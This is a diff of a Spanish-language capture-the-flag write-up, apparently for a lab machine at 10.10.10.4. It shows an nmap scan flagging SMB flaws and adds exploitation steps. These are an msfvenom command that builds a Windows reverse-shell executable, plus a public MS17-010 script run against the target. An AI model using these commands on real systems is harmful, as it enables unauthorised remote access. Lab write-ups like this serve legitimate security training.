@@ -30,6 +30,7 @@ Busquemos vulnerabilidades asociadas a los puertos abiertos
 ```bash
 sudo nmap -p 445 --script vuln 10.10.10.4
 ```
+```
 |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
 | smb-vuln-ms08-067: 
 |   VULNERABLE:
@@ -47,4 +48,20 @@ sudo nmap -p 445 --script vuln 10.10.10.4
 ```
 
 ### Exploit
+
+#### MS17-010
+
+Utilizaremos el script de send_and_execute de este repositorio
+```web
+https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py
+```
+Generamos una reverse shell para windows en formato ejecutable
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f exe -a x86 — platform windows -o rev_shell.exe
+```
+Ejecutamos el script mencionado arriba
+```bash
+python2.7 send_and_execute.py 10.10.10.4 rev_shell.exe
+```
+#### MS08-67
 
